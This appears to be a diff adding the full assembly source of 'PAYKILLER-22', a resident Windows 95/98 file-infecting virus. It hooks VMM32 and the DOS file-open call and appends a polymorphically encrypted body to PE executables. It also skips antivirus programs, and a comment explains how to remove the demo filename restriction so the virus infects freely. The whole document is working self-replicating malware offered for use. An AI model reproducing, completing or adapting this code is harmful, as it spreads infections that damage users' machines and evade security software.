@@ -1,0 +1,687 @@
+;           //////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\
+;          |             M  A  D   R  O  C  K  E R               |
+;          |                  p r e s e n t s                    |
+;          |                                                     |
+;          |              P A Y K I L L E R - 2 2                |
+;          |                                                     |
+;          |         f o r   W I N D O W S   9 5 - 9 8           |
+;           \\\\\\\\\\\\\\\\\\\\\\\\\\///////////////////////////
+;
+;  It's a resident ( VMM32 - inserting ) virus, that infects only
+;Portable Executable (PE) files. Hooks V86 interrupt chain, function 3dh
+;of DOS service (open file). Virus modifies some fields of the last section
+;and writes the main encrypted body with decryptor to the end of file.
+;No destruction, no stealth, no anti-tracing/debugging... This is a DEMO
+;version so only files with name "VICTIMXX.EXE(SCR)" will be infected.
+;Warning : if you want to add some your improvements into the base code,
+;you MUST control the size of virus body (pad size to dword boundary).
+;Lounche and enjoy ! :-)))
+;                                                   Mad  Rocker
+;
+    .386
+    locals
+    jumps
+    model flat,stdcall
+extrn  ExitProcess:proc
+        .data
+;
+HeapZeroInit  equ 1
+;
+virus:
+decoder db    60h,6fh dup (90h)  ;virus decryptor
+decoder_size  equ $-decoder      ;size of decryptor
+        mov   ebp,esp
+        mov   ebp,[ebp+1ch]   ;EBP=stored EAX (we assume that EAX=EIP)
+        jmp   short main_body
+head_virus    equ $-virus
+;       Virus DATA block
+old_RVA      dd   offset end_of_game
+virus_RVA    dd   offset virus
+vir_buffer   dd   0           ;address of virus copy location
+busy_flag    db   0
+PE_pointer   dw   0           ;pointer to PE-header
+Obj_pointer  dw   0
+norm_physic  dd   0           ;size of virus code in File   sectors
+norm_virtual dd   0           ;size of virus code in Object sectors
+last_objsize dd   0           ;size of last object data
+last_objbuff dd   0
+file_date    dw   0           ;date of file creation
+file_time    dw   0           ;time of file creation
+file_mode    dw   0           ;file attributes
+;
+main_body:
+        nop
+        xor   eax,eax
+        mov   esi,0c0001000h               ;start of VMM32.VXD code
+        xor   ecx,ecx
+        cld
+search_hole:                               ;search the zero area in the VMM
+        lodsd
+        sub   esi,3
+        or    esi,esi
+        jz    short bypass_control
+        cmp   eax,'KCUF'                   ;test for our presence in memory
+        je    short bypass_control
+        or    al,al                        ;AL is equal to zero ?
+        jz    short test_size              ;let explore how many zero's
+                                           ;we can find above the present
+        xor   ecx,ecx
+        jmp   short search_hole
+test_size:
+        inc   ecx
+        cmp   ecx,virus_size+100h          ;the size of zero area must be
+                                           ;more than (size of virus + 100h)
+        jb    short search_hole
+        xchg  edi,esi
+        sub   edi,virus_size+100h          ;EDI-> start of zero area
+WIN_95:
+        mov   esi,0c000157fh               ;pointer to WIN 95 VMM32.VXD DDB
+        mov   esi,[esi]
+        cmp   esi,0d0000000h
+        ja    short WIN_98
+        jmp   short get_signature
+WIN_98:
+        mov   esi,0c0001811h               ;pointer to WIN 98 VMM32.VXD DDB
+        mov   esi,[esi]
+get_signature:
+        add   esi,0ch
+        lodsd
+        xor   eax,' MMV'                   ;ask for VMM32 identifier
+        jnz   short bypass_control
+        add   esi,20h
+        lodsd                              ;EAX-> VMM_Service_Table
+        lea   ebx,[eax+15*4]               ;EBX=address of pointer of
+                                           ;Schedule_VM_event service
+        mov   [poinaddress-virus+ebp],ebx  ;save pointer to original address
+        mov   eax,[ebx]                    ;get address of Schedule_VM_event
+        mov   [realaddress-virus+ebp],eax  ;save original address
+        mov   eax,edi
+        mov   [location-virus+ebp],eax     ;save the start of zero area
+        mov   [delta_offset-virus+ebp],eax
+        add   eax,VMM_init-virus
+        mov   [ebx],eax                    ;hook Schedule_VM_event service
+        mov   esi,ebp                      ;ESI-> start of virus
+        mov   ecx,virus_size
+        cld
+        rep   movsb                        ;copy virus to VMM32 area
+; We can not be sure that our infected program will be loaded by system
+;always at the Image_Base address. For example our program has
+;Image_Base RVA=1000h. However the minimal value of Entrypoint RVA under
+;Windows 95-98 is 400000h ! So in this case we have to calculate the REAL
+;Entrypoint RVA and fix it.
+bypass_control:
+        mov   eax,[virus_RVA-virus+ebp]
+        cmp   eax,ebp        ;is the REAL Entrypoint equal to RVA Entrypoint?
+        je    short no_update_RVA
+        mov   ebx,ebp
+        sub   ebx,eax        ;delta of Image Base
+        add   [old_RVA-virus+ebp],ebx
+no_update_RVA:
+        mov   eax,[old_RVA-virus+ebp]
+        mov   ebp,esp
+        mov   [ebp+1ch],eax  ;fix EAX value into the stack
+        popad                ;now EAX=the real RVA Entrypoint
+        jmp   $+2            ;break prefetch for 386-486 processors
+        push  eax
+        ret                  ;return control to original code
+;
+VMM_init:
+        pushad
+              db   0bdh      ;MOV EBP,address of our location
+location      dd   0
+              db   0bfh      ;MOV EDI,pointer to address of Schedule_VM_event
+poinaddress   dd   0
+        mov   eax,[realaddress-virus+ebp]
+        cld
+        stosd                ;restore address of Schedule_VM_event handler
+        push  HeapZeroInit
+        push  virus_size
+dyna_link:
+        int   20h
+        dd    0001004fh      ;VMMCall _HeapAllocate
+        add   esp,8
+        mov   [vir_buffer-virus+ebp],eax
+        mov   word ptr  [dyna_link-virus+ebp],20cdh
+        mov   dword ptr [dyna_link+2-virus+ebp],0001004fh
+        mov   edi,eax        ;EDI-> buffer
+        mov   esi,ebp        ;ESI-> working resident copy
+        mov   ecx,virus_size ;ECX=size of virus
+        rep   movsb          ;store resident copy
+        mov   eax,21h
+        lea   esi,[RING_0_CODE-virus+ebp]
+        int   20h
+        dd    00010041h      ;VMMCall Hook_V86_Int_Chain
+        popad
+VMM_quit:
+             db   0eah       ;jump to original Schedule_VM_event handler
+realaddress  dd   0          ;original address of Schedule_VM_event
+             dw   28h
+;
+INT_21h:
+        push  21h             ;Number of executing interrupt
+        int   20h
+        dd    0001008fh       ;VMMCall Exec_VxD_Int
+        ret
+;
+RING_0_CODE:                  ;the interceptor of V86_Int_Chain calling
+        cmp   byte ptr [ebp+1dh],3dh
+        jne   go_out          ;function 3dh of interrupt 21h  ?
+              db   0beh       ;MOV ESI,the head of virus
+delta_offset  dd   0
+        cmp   byte ptr [busy_flag-virus+esi],1
+        je    go_out
+        mov   byte ptr [busy_flag-virus+esi],1
+        sub   esp,6ch
+        push  edi
+        lea   edi,dword ptr [esp+4]
+        int   20h
+        dd    0001008dh       ;VMMCall Push_Client_State
+        pop   edi
+        int   20h
+        dd    00010083h       ;VMMCall Begin_Nest_Exec
+        movzx edx,word ptr [ebp+3ch]
+        movzx eax,word ptr [ebp+14h]
+        shl   edx,4
+        add   edx,eax         ;EDX->name of file in ASCIIZ-format
+        push  esi
+        mov   esi,edx
+        mov   ecx,edx
+        cld
+search_zero:                  ;try to find end of name
+        lodsb
+        or    al,al
+        jnz   short search_zero
+        sub   esi,ecx
+        mov   ecx,esi         ;ECX=size of file name
+        pop   esi
+        mov   edi,edx
+        push  ecx
+test_ext:                     ;test file extension for '.EXE' or '.SCR'
+        mov   eax,'EXE.'
+        scasd
+        jz    short our_client
+        sub   edi,4
+        mov   eax,'RCS.'
+        scasd
+        jz    short our_client
+        sub   edi,3
+        loop  test_ext
+        pop   ecx
+        jmp   short prepare_exit
+our_client:
+        pop   ecx             ;search some strings in the name of file
+        mov   edi,edx
+test_name:
+;------------------------------;
+        mov   eax,'TCIV'      ;this chain is needed only for testing and
+        scasd                 ;debugging. If you want to create a "military
+        jz    short file_open ;realization" you have to remove that :-)
+        sub   edi,4
+;------------------------------;
+        mov   eax,'EWRD'      ;DRWEB for WIN 95-98 ... SUXX !!!
+        scasd
+        jz    short prepare_exit
+        sub   edi,4
+        mov   eax,'VABT'      ;Thunder Byte AntiVirus-no comments :-)
+        scasd
+        jz    short prepare_exit
+        sub   edi,4
+        mov   eax,'3PVA'      ;the more powerful software... However it is
+                              ;also stupid...
+        scasd
+        jz    short prepare_exit
+        sub   edi,3
+        loop  test_name
+        jmp   short prepare_exit
+file_open:
+        push  edx
+        mov   ax,4300h
+        call  INT_21h         ;get file attributes
+        mov   [file_mode-virus+esi],cx
+        xor   cx,cx
+        mov   ax,4301h        ;set "zero" attribute
+        call  INT_21h
+        mov   ax,3d02h        ;open file for read-write access
+        call  INT_21h
+        jc    short restore_attrib
+        xchg  ebx,eax         ;store file handle
+        call  InfecT          ;call the main infection module :-)
+restore_attrib:
+        pop   edx
+        mov   ax,4301h
+        mov   cx,[file_mode-virus+esi]
+        call  INT_21h         ;restore file attributes
+prepare_exit:
+        int   20h
+        dd    00010086h       ;VMMCall End_Nest_Exec
+        push  esi
+        lea   esi,dword ptr [esp+4]
+        int   20h
+        dd    0001008eh       ;VMMCall Pop_Client_State
+        pop   esi
+        add   esp,6ch
+        mov   byte ptr [busy_flag-virus+esi],0
+go_out:
+        stc
+        ret
+;
+InfecT:
+        mov   ah,3fh          ;read DOS header
+        mov   ecx,40h
+        lea   edx,dword ptr [EXE_header-virus+esi]
+        call  INT_21h
+        mov   ax,4200h        ;move file pointer to PE-header
+        xor   ecx,ecx
+        mov   dx,word ptr [EXE_header+3ch-virus+esi]
+        mov   [PE_pointer-virus+esi],dx
+        call  INT_21h
+        mov   ah,3fh          ;read PE-header
+        mov   ecx,60h
+        lea   edx,[EXE_header-virus+esi]
+        call  INT_21h
+        cmp   word ptr [EXE_header-virus+esi],'EP'
+        jne   file_close      ;it must be a Portable Executable file
+        mov   eax,[EXE_header+4ch-virus+esi]
+        mov   edx,eax
+        shr   eax,10h
+        xor   eax,edx
+        cmp   ax,'RM'
+        je    file_close      ;unfortunatly, this file is already infected
+        mov   ax,5700h
+        call  INT_21h         ;get date and time of file creation
+        mov   [file_time-virus+esi],cx
+        mov   [file_date-virus+esi],dx
+        mov   ax,word ptr [EXE_header+6-virus+esi] ;total number of objects
+        dec   eax
+        mov   cx,28h          ;size of each Object table item
+        mul   cx
+        add   ax,18h
+        add   ax,[EXE_header+14h-virus+esi] ;+ NT header size
+        add   ax,[PE_pointer-virus+esi]     ;+ Pointer to PE-header
+        mov   [Obj_pointer-virus+esi],ax ;store pointer to the last item of
+                                         ;Object table
+        xor   ecx,ecx
+        xchg  edx,eax
+        mov   ax,4200h        ;move file pointer to 2 last items
+        call  INT_21h
+        mov   ah,3fh          ;read  last item of Object table
+        mov   ecx,28h         ;size of item
+        lea   edx,[our_object-virus+esi]
+        call  INT_21h
+        mov   eax,virus_size  ;EAX=size of virus code (main body+decryptor)
+        xor   edx,edx
+        push  eax
+        push  edx
+        mov   ecx,[EXE_header+3ch-virus+esi]
+        div   ecx             ;divided to File Alignment factor
+        or    edx,edx
+        jz    $+3
+        inc   eax
+        mul   ecx             ;EAX=size of virus in File sectors
+        mov   [norm_physic-virus+esi],eax
+        pop   edx
+        pop   eax
+        mov   ecx,[EXE_header+38h-virus+esi]
+        div   ecx             ;divided to Object Alignment factor
+        or    edx,edx
+        jz    $+3
+        inc   eax
+        mul   ecx             ;EAX=size of virus in Object sectors
+        mov   [norm_virtual-virus+esi],eax
+        mov   eax,4202h
+        xor   ecx,ecx
+        cdq
+        call  INT_21h          ;move file pointer to the end of file
+        mov   ecx,[EXE_header+3ch-virus+esi] ;ECX=File Alignment factor
+        div   ecx
+        or    edx,edx
+        jz    $+3
+        inc   eax
+        mul   ecx
+        shl   edx,10h
+        add   edx,eax     ;EDX=size of file in File sectors
+        mov   ecx,edx
+        sub   edx,[our_object+14h-virus+esi] ; - Physical offset of last
+                                             ;object data
+        mov   [our_object+10h-virus+esi],edx ;the end of file MUST be equal
+                                             ;to the end of last object data
+        mov   eax,[our_object+8-virus+esi]   ;EAX=Virtual size of last object
+        cmp   eax,edx                        ;is the virtual size grater than
+                                             ;physical size of last object ?
+        jae   short no_virtual_preupdate
+        mov   [our_object+8-virus+esi],edx   ;it's necessary to correct
+                                             ;the field named "Virtual size"
+no_virtual_preupdate:
+        mov   eax,4200h
+        mov   edx,ecx
+        shr   ecx,10h
+        call  INT_21h                        ;move file pointer to the "new"
+                                             ;end of file
+        mov   edi,[vir_buffer-virus+esi]     ;EDI-> virus copy
+        add   edi,head_virus
+        mov   eax,[EXE_header+28h-virus+esi]  ;EAX=RVA Entrypoint
+        add   eax,[EXE_header+34h-virus+esi]  ;+ Image_Base
+        stosd                                 ;save RVA Entrypoint
+        mov   eax,[our_object+0ch-virus+esi]  ;object RVA
+        mov   edx,[our_object+10h-virus+esi]  ;Object Physical size
+        add   eax,edx
+        mov   [EXE_header+28h-virus+esi],eax  ;update Entrypoint
+        add   eax,[EXE_header+34h-virus+esi]  ;+ Image_Base
+        stosd
+        add   edx,[norm_physic-virus+esi]
+        mov   [our_object+10h-virus+esi],edx  ;update Object Physical size
+        mov   eax,virus_size
+        add   [our_object+8-virus+esi],eax    ;update Object Virtual size
+        mov   eax,[norm_virtual-virus+esi]
+        add   [EXE_header+50h-virus+esi],eax  ;update Image_Size
+        or    [our_object+24h-virus+esi],0e0000000h ;add flags that provides
+                                                    ;a possibility of reading,
+                                                    ;writing and executing
+        mov   ax,'RM'         ;identifier of infection
+        mov   cx,[file_time-virus+esi]
+        xor   ax,cx           ;encrypt it
+        mov   [EXE_header+4ch-virus+esi],ax  ;store identifier
+        mov   [EXE_header+4eh-virus+esi],cx  ;store key
+;
+;We have to reinitialize the buffer contains the virus copy in agreement of
+;File alignment factor. This step can be ignored,but it very beautiful if
+;infected file has properties of "normal" file. "Normal" files always has
+;a zero block at the end...
+;
+        push  HeapZeroInit
+        push  dword ptr [norm_physic-virus+esi]
+        push  dword ptr [vir_buffer-virus+esi]
+        int   20h
+        dd    00010050h                      ;VMMCall _HeapReallocate
+        add   esp,0ch
+        or    eax,eax
+        jz    short file_close
+        mov   [vir_buffer-virus+esi],eax     ;pointer to the new buffer
+        call  CRYPTOGEN_WIN32enc             ;generate decryptor and encrypt
+                                             ;the virus copy
+        mov   ah,40h
+        mov   ecx,[norm_physic-virus+esi]    ;modified size of virus code
+        mov   edx,[vir_buffer-virus+esi]     ;location of virus
+        call  INT_21h                        ;write virus code
+        call  CRYPTOGEN_WIN32dec             ;decrypt the virus copy
+        mov   ax,4200h
+        xor   ecx,ecx
+        mov   dx,[Obj_pointer-virus+esi]
+        call  INT_21h                        ;move file pointer to the last
+                                             ;item of Object table
+        mov   ah,40h
+        mov   ecx,28h         ;ECX=28h-size of item of Object Table
+        lea   edx,[our_object-virus+esi]
+        call  INT_21h         ;write two last modified object items
+        mov   ax,4200h
+        xor   ecx,ecx
+        mov   dx,[PE_pointer-virus+esi]
+        call  INT_21h         ;move file pointer to the start of PE-header
+        mov   ah,40h
+        mov   ecx,060h
+        lea   edx,[EXE_header-virus+esi]
+        call  INT_21h         ;write the modified PE-header
+        mov   ax,5701h
+        mov   cx,[file_time-virus+esi]
+        mov   dx,[file_date-virus+esi]
+        call  INT_21h         ;restore file creation date/time
+file_close:
+        mov   ah,3eh          ;close file
+        call  INT_21h
+        ret
+;---------------------------------------------
+CRYPTOGEN_WIN32enc:           ;the Polimorphic generator
+        push  esi
+        push  edi
+        push  ebx
+        sub   esi,offset virus
+        mov   edi,[vir_buffer+esi]
+        mov   ah,2ch
+        call  INT_21h         ;get system time
+        rol   edx,cl
+        xor   ecx,edx
+        mov   [_random+esi],ecx ;ECX=some random value
+        mov   edx,ecx
+        xor   ebx,ebx
+        shr   ecx,18h
+        inc   ecx
+detect_regs:                  ;we give the "role" to each of registers : EAX,
+                              ;EBX,ECX,EDX
+        mov   bl,dl
+        shr   bl,6            ;BL=0..3
+        mov   al,byte ptr [_REGISTERS+ebx+esi]
+        rol   edx,1
+        mov   bl,dl
+        shr   bl,6
+        mov   ah,byte ptr [_REGISTERS+ebx+esi]
+;Do you understand , what I'm doing ? I'm mix registers... One of register
+;will contain a key of encryption,second will be a "pointer" to encrypted
+;body etc...
+        mov   byte ptr [_REGISTERS+ebx+esi],al
+        ror   edx,1
+        mov   bl,dl
+        shr   bl,6
+        mov   byte ptr [_REGISTERS+ebx+esi],ah
+        xor   edx,ecx
+        rol   edx,1
+        loop  detect_regs
+        mov   ecx,decoder_size
+        mov   edx,[_random+esi]
+        cld
+;
+;fill the decryptor block (70h bytes) by one-byte instructions (CLD,STD etc)
+;
+fill_decoder:
+        mov   bl,dl
+        shr   bl,6            ;BL=0..3
+        mov   al,byte ptr [_garbage+ebx+esi] ;get instruction from table
+        stosb
+        rcl   edx,1
+        xor   edx,[_random+esi]
+        mov   [_random+esi],edx
+        loop  fill_decoder
+        mov   edi,[vir_buffer+esi]           ;EDI->start of decryptor
+        call  inc_EDI
+;
+;the first "normal" instruction of decryptor will be "PUSHA"...
+;
+set_PUSHA:
+        mov   al,60h
+        stosb
+        call  inc_EDI
+set_PUSH_EAX:
+        mov   al,50h
+        stosb
+        call  inc_EDI
+;
+;Now let determine the "pointer" to the main encrypted virus body.
+;When the WIN32 program starting, EAX = Entrypoint. The chain consisted of
+;two instructions (PUSH EAX - POP XXX) will give me the pointer value.
+;
+set_INIT_POINTER:
+        mov   al,58h      ;"PUSH EAX" instruction
+        add   al,byte ptr [_pointer+esi]
+        stosb
+        call  inc_EDI
+
+set_INIT_KEY:
+        mov   al,0b8h     ;"MOV REGISTER,XXXX" prefix
+        add   al,byte ptr [_key+esi]
+        stosb
+        mov   eax,edx
+        mov   [_enckey+esi],edx
+        stosd
+        call  inc_EDI
+set_INIT_RND1:
+        mov   al,0b8h     ;the same command
+        add   al,byte ptr [_unusable+esi]
+        stosb
+        mov   eax,[_random+esi]
+        mov   [_rnd_1+esi],eax
+        stosd
+        call  inc_EDI
+FINAL_INIT_POINTER:
+        mov   al,0b8h
+        add   al,byte ptr [_counter+esi]
+        stosb
+        mov   eax,virus_size
+        sub   eax,[_rnd_1+esi]
+        stosd
+        call  inc_EDI
+        mov   al,03h
+        stosb
+        mov   al,0c0h
+        mov   ah,byte ptr [_counter+esi]
+        shl   ah,3
+        add   al,ah
+        add   al,byte ptr [_unusable+esi]
+        stosb
+        call  inc_EDI
+        mov   al,03h
+        stosb
+        mov   al,0c0h
+        mov   ah,byte ptr [_pointer+esi]
+        shl   ah,3
+        add   al,ah
+        add   al,byte ptr [_counter+esi]
+        stosb
+        call  inc_EDI
+;
+;I'll initialize the "counter" register by using a non-trivial method.First,I
+;move to "counter" register a random value (V1). Second ,I initialize another
+;register by the value(V2), that calculated as: V2=size of virus - V1.
+;Finishly, the "ADD" instruction (V1+V2) will initialize the counter register
+;
+set_INIT_RND2:
+        mov   al,0b8h
+        add   al,byte ptr [_unusable+esi]
+        stosb
+        mov   eax,[_random+esi]
+        mov   [_rnd_2+esi],eax
+        stosd
+        call  inc_EDI
+set_INIT_COUNTER:
+        mov   al,0b8h
+        add   al,byte ptr [_counter+esi]
+        stosb
+        mov   eax,virus_size-decoder_size+4
+        sub   eax,[_rnd_2+esi]
+        stosd
+        call  inc_EDI
+        mov   al,03h
+        stosb
+        mov   al,0c0h
+        mov   ah,byte ptr [_counter+esi]
+        shl   ah,3
+        add   al,ah
+        add   al,byte ptr [_unusable+esi]
+        stosb
+        call  inc_EDI
+        mov   [_st_cycle+esi],edi
+set_XOR:                           ;I use a simple "XOR" cycle to encrypt
+        mov   al,31h
+        stosb
+        mov   al,byte ptr [_key+esi]
+        shl   al,3
+        add   al,byte ptr [_pointer+esi]
+        stosb
+        call  inc_EDI
+        mov   ecx,4
+set_DEC_POINTER:
+        mov   al,48h
+        add   al,byte ptr [_pointer+esi]
+        stosb
+        call  inc_EDI
+        loop  set_DEC_POINTER
+set_ROL_KEY:                      ;the key of encryption will be dinamically
+                                  ;changed from double word to double word...
+        mov   al,0d1h             ;"ROL REGISTER,1" prefix
+        stosb
+        mov   al,0c0h
+        add   al,[_key+esi]
+        stosb
+        call  inc_EDI
+set_XOR_KEY:
+        mov   al,33h
+        stosb
+        mov   al,0c0h
+        mov   ah,byte ptr [_key+esi]
+        shl   ah,3
+        add   al,ah
+        add   al,byte ptr [_counter+esi]
+        stosb
+        call  inc_EDI
+        mov   ecx,4
+set_DEC_COUNTER:
+        mov   al,48h
+        add   al,byte ptr [_counter+esi]
+        stosb
+        call  inc_EDI
+        loop  set_DEC_COUNTER
+set_LOOP:
+        mov   al,75h
+        stosb
+        mov   eax,0ffh
+        sub   eax,edi
+        add   eax,[_st_cycle+esi]
+        stosb
+        add   esi,offset virus
+        call  CRYPTOGEN_WIN32dec
+        pop   ebx
+        pop   edi
+        pop   esi
+        ret
+;
+inc_EDI:                             ;this routine increases the EDI-pointer
+        xor   ebx,ebx                ;to decryptor
+        mov   bl,dl
+        shr   bl,6
+        rcl   edx,1
+        xor   edx,[_random+esi]
+        mov   [_random+esi],edx
+        add   edi,ebx
+        ret
+_random   dd   0
+_rnd_1    dd   0
+_rnd_2    dd   0
+_st_cycle dd   0
+;
+; I numbering the each of registers (EAX->0,ECX->1,EDX->2,EBX->3)
+;
+_REGISTERS:
+_pointer  db   0
+_counter  db   1
+_key      db   2
+_unusable db   3
+;
+_enckey   dd   0
+_garbage  db   90h,0f8h,0fch,0fdh
+;--------------------------------------------
+CRYPTOGEN_WIN32dec:
+        push  edi
+        mov   edi,[vir_buffer-virus+esi]
+        add   edi,virus_size
+        mov   ecx,virus_size-decoder_size+4
+        mov   eax,[_enckey-virus+esi]
+encrypt_body:
+        xor   [edi],eax
+        sub   edi,4
+        rol   eax,1
+        xor   eax,ecx
+        sub   ecx,4
+        jnz   encrypt_body
+        pop   edi
+        ret
+virus_size   equ $-virus      ;the size of virus
+EXE_header:
+our_object   equ EXE_header+60h
+;
+        .code
+start:                        ;original program
+        mov    eax,offset virus
+        jmp    virus          ;bypass control to virus code
+end_of_game:
+        xor    eax,eax
+        push   eax
+        call   ExitProcess
+             end  start
